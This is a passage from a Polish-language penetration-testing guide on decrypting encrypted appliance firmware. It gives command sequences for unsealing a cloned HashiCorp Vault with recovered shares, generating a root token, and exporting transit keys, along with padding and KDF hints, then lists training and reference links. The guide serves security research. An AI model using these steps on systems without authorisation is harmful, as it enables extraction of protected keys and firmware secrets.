- Odłączony materiał PGP w tym samym pliku często chroni wyłącznie authenticity; nie zakładaj, że jest mechanizmem confidentiality.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, wykonaj reverse engineering **operacyjnej ścieżki deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / binary zarządzający i prześledź, kto odczytuje encrypted blob, który helper/API go unwrapuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także unit files i init scripts.
- Traktuj plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens lub lokalne skrypty auto-unseal KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli appliance zawiera oryginalny binary Vault oraz storage backend, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja mechanizmów wewnętrznych Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Mając uprawnienia root na sklonowanym KMS:

- Ustaw klucze transit jako możliwe do eksportu wyłącznie wewnątrz izolowanego klonu: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 oraz nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych appliance'ach), a dopiero potem spróbuj odszyfrowania AES-CBC.

Sprowadza to problem „zaszyfrowanego firmware'u” do bardziej ogólnego zadania: **odzyskaj klucze operacyjne po stronie appliance'a, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referencje

- [1] [Cracking Firmware with Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware'u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: ostateczny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez jego złącze ładowania - część 2: omijanie anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: wykorzystywanie Philips Hue Bridge over-the-air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
